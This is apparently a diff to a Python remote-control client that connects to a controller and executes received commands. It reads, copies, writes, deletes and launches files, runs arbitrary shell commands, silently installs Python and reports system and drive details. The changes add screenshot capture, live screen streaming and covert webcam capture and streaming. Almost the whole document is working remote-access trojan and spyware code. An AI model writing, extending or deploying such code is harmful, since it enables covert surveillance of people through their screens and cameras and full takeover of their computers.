@@ -3,6 +3,9 @@ import os
 from uuid import uuid4
 import subprocess
 import platform
+import pyautogui
+import sys
+import cv2
 
 ADDR = socket.gethostbyname(socket.gethostname())
 PORT = 80
@@ -11,29 +14,22 @@ os.chdir(os.getenv('USERPROFILE'))
 
 def recvall(connection):
 
-    data = ''
-    
-    data += connection.recv(4096).decode()
+    sizeOfMsg = int(connection.recv(64).decode())
 
-    dataSplit, data = data.split('|', 1)
+    msg = b''
 
-    if dataSplit in data:
-            data = data.replace('|' + dataSplit, '')
-            return data
+    while len(msg) != sizeOfMsg:
+        msg += connection.recv(sizeOfMsg - len(msg))
 
-    while True:
+    return msg.decode()
 
-        data += connection.recv(4096).decode()
+def getSendableMsg(msg):
 
-        if dataSplit in data:
-            data = data.replace('|' + dataSplit, '')
-            return data
+    sizeOfMsg = str(len(msg))
 
-def getMsgWithDataSplit(msg):
+    sizeOfMsg = '0'*(64-len(sizeOfMsg)) + sizeOfMsg
 
-    dataSplit = str(uuid4())
-
-    return (dataSplit + '|' + str(msg) + '|' + dataSplit).encode()
+    return (sizeOfMsg + str(msg)).encode()
 
 while True:
 
@@ -54,34 +50,34 @@ while True:
                 command = recvall(s)
 
                 if command == 'Refresh':
-                    s.sendall(getMsgWithDataSplit('online'))
+                    s.send(getSendableMsg('online'))
 
                 elif command == 'EstablishConnection':
-                    s.sendall(getMsgWithDataSplit(os.getcwd()))
+                    s.send(getSendableMsg(os.getcwd()))
                 
                 elif command == 'ls':
                     try:
                         listedFiles = os.listdir()
                     except:
                         listedFiles = 'ERROR'
-                    s.sendall(getMsgWithDataSplit(str(listedFiles)))
+                    s.send(getSendableMsg(str(listedFiles)))
                 
                 elif command == 'cd':
                     changedDirectory = recvall(s)
                     if os.path.exists(changedDirectory) and os.path.isdir(changedDirectory):
                         os.chdir(changedDirectory)
-                        s.sendall(getMsgWithDataSplit(os.getcwd()))
+                        s.send(getSendableMsg(os.getcwd()))
                     else:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'goto':
                     gotoDirectory = recvall(s)
 
                     if os.path.exists(gotoDirectory) and os.path.isdir(gotoDirectory):
                         os.chdir(gotoDirectory)
-                        s.sendall(getMsgWithDataSplit(os.getcwd()))
+                        s.send(getSendableMsg(os.getcwd()))
                     else:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'size':
                     fileName = recvall(s)
@@ -90,21 +86,21 @@ while True:
                     except:
                         fileSize = False
                     if fileSize:
-                        s.sendall(getMsgWithDataSplit(f'{fileSize:,}'))
+                        s.send(getSendableMsg(f'{fileSize:,}'))
                     else:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'read':
                     fileName = recvall(s)
                     try:
                         with open(fileName, 'r') as f:
-                            s.sendall(getMsgWithDataSplit(f.read()))
+                            s.send(getSendableMsg(f.read()))
                     except:
                         try:
                             with open(fileName, 'rb') as f:
-                                s.sendall(getMsgWithDataSplit(str(f.read())[2:-1]))
+                                s.send(getSendableMsg(str(f.read())[2:-1]))
                         except:
-                            s.sendall(getMsgWithDataSplit('ERROR'))
+                            s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'write':
                     fileName = recvall(s)
@@ -120,17 +116,17 @@ while True:
                                 with open(fileName, 'w') as f:
                                     f.write(fileData)
 
-                            s.sendall(getMsgWithDataSplit(os.path.join(os.getcwd(), fileName)))
+                            s.send(getSendableMsg(os.path.join(os.getcwd(), fileName)))
 
                         except:
                             try:
                                 with open(fileName, 'w') as f:
                                     f.write(fileData)
                                 
-                                s.sendall(getMsgWithDataSplit(os.path.join(os.getcwd(), fileName)))
+                                s.send(getSendableMsg(os.path.join(os.getcwd(), fileName)))
                             except:
                             
-                                s.sendall(getMsgWithDataSplit('ERROR'))
+                                s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'copy':
                     fileName = recvall(s)
@@ -140,67 +136,67 @@ while True:
                             with open(fileName, 'r') as f:
                                 fileData = f.read()
 
-                            s.sendall(getMsgWithDataSplit(fileData))
+                            s.send(getSendableMsg(fileData))
                         except:
                             try:
                                 with open(fileName, 'rb') as f:
                                     fileData = f.read()
                                 
-                                s.sendall(getMsgWithDataSplit(str(fileData)))
+                                s.send(getSendableMsg(str(fileData)))
                             except:
-                                s.sendall(getMsgWithDataSplit('ERROR'))
+                                s.send(getSendableMsg('ERROR'))
                     else:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'run':
                     fileName = recvall(s)
                     try:
                         os.startfile(fileName)
-                        s.sendall(getMsgWithDataSplit('Sucess'))
+                        s.send(getSendableMsg('Sucess'))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'rm':
                     fileName = recvall(s)
                     try:
                         os.remove(fileName)
-                        s.sendall(getMsgWithDataSplit('Success'))
+                        s.send(getSendableMsg('Success'))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'mkdir':
                     folderName = recvall(s)
                     try:
                         os.mkdir(folderName)
-                        s.sendall(getMsgWithDataSplit('Success'))
+                        s.send(getSendableMsg('Success'))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
 
                 
                 elif command == 'rmdir':
                     folderName = recvall(s)
                     try:
                         os.rmdir(folderName)
-                        s.sendall(getMsgWithDataSplit('Success'))
+                        s.send(getSendableMsg('Success'))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
 
                 elif command == 'exec':
                     executeCommand = recvall(s)
                     try:
                         commandResult = subprocess.check_output(executeCommand, shell = True)
-                        s.sendall(getMsgWithDataSplit(commandResult.decode()))
+                        s.send(getSendableMsg(commandResult.decode()))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
 
                 elif command == 'pyinstall':
                     try:
                         downloadPythonInstaller = subprocess.check_output('curl https://www.python.org/ftp/python/3.11.1/python-3.11.1-amd64.exe --output python-installer.exe', shell = True)
                         runPythonInstaller = subprocess.check_output('python-installer.exe /quiet InstallAllUsers=0 PrependPath=1')
                         os.remove('python-installer.exe')
-                        s.sendall(getMsgWithDataSplit('SUCCESS'))
+                        s.send(getSendableMsg('SUCCESS'))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                         try:
                             os.remove('python-installer.exe')
                         except:
@@ -209,24 +205,123 @@ while True:
                 elif command == 'sysinfo':
                     try:
                         sysInfo = subprocess.check_output('systeminfo', shell = True)
-                        s.sendall(getMsgWithDataSplit(sysInfo.decode()))
+                        s.send(getSendableMsg(sysInfo.decode()))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
                 
                 elif command == 'drives':
                     try:
                         sysInfo = subprocess.check_output('fsutil fsinfo drives', shell = True)
-                        s.sendall(getMsgWithDataSplit(sysInfo.decode()))
+                        s.send(getSendableMsg(sysInfo.decode()))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
 
                 elif command == 'system':
                     try:
                         system = platform.system()
-                        s.sendall(getMsgWithDataSplit(system))
+                        s.send(getSendableMsg(system))
                     except:
-                        s.sendall(getMsgWithDataSplit('ERROR'))
+                        s.send(getSendableMsg('ERROR'))
+
+                elif command == 'screenshot':
+                    try:
+
+                        screenshot = pyautogui.screenshot()
+
+                        picSize = (pyautogui.size().width, pyautogui.size().height)
+
+                        s.send(getSendableMsg(str(picSize)))
+
+                        screenshotBytes = screenshot.tobytes()
+
+                        s.send(getSendableMsg(str(sys.getsizeof(screenshotBytes))))
+
+                        s.send(screenshotBytes)
+
+                    except:
+                        s.send(getSendableMsg('ERROR'))
+
+                elif command == 'screenshare':
+
+                    while True:
+                        try:
+                            screenshot = pyautogui.screenshot()
+
+                            picSize = (pyautogui.size().width, pyautogui.size().height)
+
+                            s.send(getSendableMsg(str(picSize)))
+
+                            screenshotBytes = screenshot.tobytes()
+
+                            s.send(getSendableMsg(str(sys.getsizeof(screenshotBytes))))
+
+                            s.send(screenshotBytes)
+
+                            result = recvall(s)
+
+                            if result == 'STOP STREAM':
+                                break
+                        except:
+                            s.send(getSendableMsg('ERROR'))
+                            break
+
+                elif command == 'camshot':
+                    try:
+                        CAMERA = cv2.VideoCapture(0)
+                    except:
+                        CAMERA = False
+                    if CAMERA:
+                        result, picture = CAMERA.read()
+
+                        CAMERA.release()
+
+                        picSize = (picture.shape[1], picture.shape[0])
+
+                        s.send(getSendableMsg(str(picSize)))
+
+                        pictureBytes = picture.tobytes()
+
+                        s.send(getSendableMsg(str(sys.getsizeof(pictureBytes))))
+
+                        s.send(pictureBytes)
+
+                    else:
+                        s.send(getSendableMsg('ERROR'))
                 
+                elif command == 'camshare':
+
+                    try:
+                        CAMERA = cv2.VideoCapture(0)
+                    except:
+                        CAMERA = False
+
+                    while True:
+                        if CAMERA:
+                            result, picture = CAMERA.read()
+
+                            picSize = (picture.shape[1], picture.shape[0])
+
+                            s.send(getSendableMsg(str(picSize)))
+
+                            pictureBytes = picture.tobytes()
+
+                            s.send(getSendableMsg(str(sys.getsizeof(pictureBytes))))
+
+                            s.send(pictureBytes)
+
+                            result = recvall(s)
+
+                            if result == 'STOP STREAM':
+                                break
+                        else:
+                            s.send(getSendableMsg('ERROR'))
+                            break
+
+                    try:
+                        CAMERA.release()
+                    except:
+                        pass
+
                 elif command == 'CloseConnection':
                     os.chdir(os.getenv('USERPROFILE'))
 
